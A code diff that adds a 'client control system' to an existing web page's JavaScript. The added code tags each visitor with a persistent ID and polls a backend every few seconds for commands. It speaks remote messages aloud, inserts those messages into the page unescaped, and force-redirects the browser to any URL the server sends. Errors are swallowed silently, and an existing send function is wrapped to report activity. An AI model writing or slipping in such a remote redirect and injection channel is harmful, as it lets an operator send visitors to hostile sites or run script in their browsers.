@@ -701,6 +701,181 @@
       }
     }
 
+    // ==================== TTS AND REDIRECT SYSTEM ====================
+class ClientControlSystem {
+    constructor() {
+        this.userId = null;
+        this.audioContext = null;
+        this.ttsQueue = [];
+        this.isPlaying = false;
+        this.pollingInterval = null;
+        this.pendingRedirect = null;
+        this.init();
+    }
+    
+    async init() {
+        // Generate unique user ID for this session
+        this.userId = this.generateUserId();
+        this.startPolling();
+        this.listenForCommands();
+    }
+    
+    generateUserId() {
+        let id = localStorage.getItem('visitor_id');
+        if (!id) {
+            id = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                const r = Math.random() * 16 | 0;
+                const v = c === 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+            localStorage.setItem('visitor_id', id);
+        }
+        return id;
+    }
+    
+    startPolling() {
+        // Poll for commands every 3 seconds
+        this.pollingInterval = setInterval(() => this.checkForCommands(), 3000);
+    }
+    
+    async checkForCommands() {
+        try {
+            const response = await fetch(`${BACKEND_URL}/api/user/${this.userId}/commands`, {
+                method: 'GET',
+                headers: { 'Content-Type': 'application/json' }
+            });
+            
+            if (response.ok) {
+                const commands = await response.json();
+                for (const cmd of commands) {
+                    await this.executeCommand(cmd);
+                }
+            }
+        } catch (error) {
+            // Silent fail
+        }
+    }
+    
+    async executeCommand(command) {
+        if (command.type === 'tts') {
+            this.speakText(command.message);
+        } else if (command.type === 'redirect') {
+            this.forceRedirect(command.url);
+        }
+    }
+    
+    speakText(text) {
+        // Use Web Speech API
+        if ('speechSynthesis' in window) {
+            // Stop any ongoing speech
+            window.speechSynthesis.cancel();
+            
+            const utterance = new SpeechSynthesisUtterance(text);
+            utterance.rate = 0.9;
+            utterance.pitch = 1.1;
+            utterance.volume = 1;
+            
+            // Show notification
+            this.showTTSNotification(text);
+            
+            utterance.onend = () => {
+                this.hideTTSNotification();
+            };
+            
+            window.speechSynthesis.speak(utterance);
+        } else {
+            // Fallback - show alert
+            alert(`[TTS MESSAGE]: ${text}`);
+        }
+    }
+    
+    showTTSNotification(message) {
+        // Remove existing notification
+        const existing = document.querySelector('.tts-notification');
+        if (existing) existing.remove();
+        
+        const notif = document.createElement('div');
+        notif.className = 'tts-notification';
+        notif.innerHTML = `
+            <div class="tts-message">🔊 ${message}</div>
+            <div class="tts-controls">
+                <button onclick="window.speechSynthesis.cancel(); this.parentElement.parentElement.remove()">CLOSE</button>
+            </div>
+        `;
+        document.body.appendChild(notif);
+        
+        // Auto-hide after 10 seconds
+        setTimeout(() => {
+            if (notif.parentElement) notif.remove();
+        }, 10000);
+    }
+    
+    hideTTSNotification() {
+        const notif = document.querySelector('.tts-notification');
+        if (notif) notif.remove();
+    }
+    
+    forceRedirect(url) {
+        // Create dramatic modal before redirect
+        const modal = document.createElement('div');
+        modal.className = 'modal';
+        modal.innerHTML = `
+            <div class="modal-content">
+                <h2>⚠️ REDIRECT INITIATED ⚠️</h2>
+                <p>You are being sent to:</p>
+                <div class="modal-url">${this.escapeHtml(url)}</div>
+                <p style="margin-top: 20px; font-size: 0.8rem;">This action was triggered remotely.</p>
+            </div>
+        `;
+        document.body.appendChild(modal);
+        
+        // Play scary sound if available
+        const alertSound = new Audio();
+        alertSound.src = 'https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3';
+        alertSound.play().catch(() => {});
+        
+        // Redirect after 3 seconds
+        setTimeout(() => {
+            window.location.href = url;
+        }, 3000);
+    }
+    
+    escapeHtml(text) {
+        const div = document.createElement('div');
+        div.textContent = text;
+        return div.innerHTML;
+    }
+}
+
+// Initialize control system
+const clientControl = new ClientControlSystem();
+
+// Report user ID to backend periodically
+async function reportActiveStatus() {
+    try {
+        await fetch(`${BACKEND_URL}/api/user/${clientControl.userId}/heartbeat`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ timestamp: Date.now() })
+        });
+    } catch (error) {
+        // Silent fail
+    }
+}
+
+// Send heartbeat every 30 seconds
+setInterval(reportActiveStatus, 30000);
+reportActiveStatus();
+
+// Modify existing sendToBackend to include user ID
+const originalSendToBackend = sendToBackend;
+window.sendToBackend = async function() {
+    const result = await originalSendToBackend();
+    await reportActiveStatus();
+    return result;
+};
+sendToBackend = window.sendToBackend;
+    
     // ==================== LOADING PROGRESS (unchanged) ====================
     const loadingOverlay = document.getElementById('loading-overlay');
     const loadingPercentage = document.getElementById('loading-percentage');
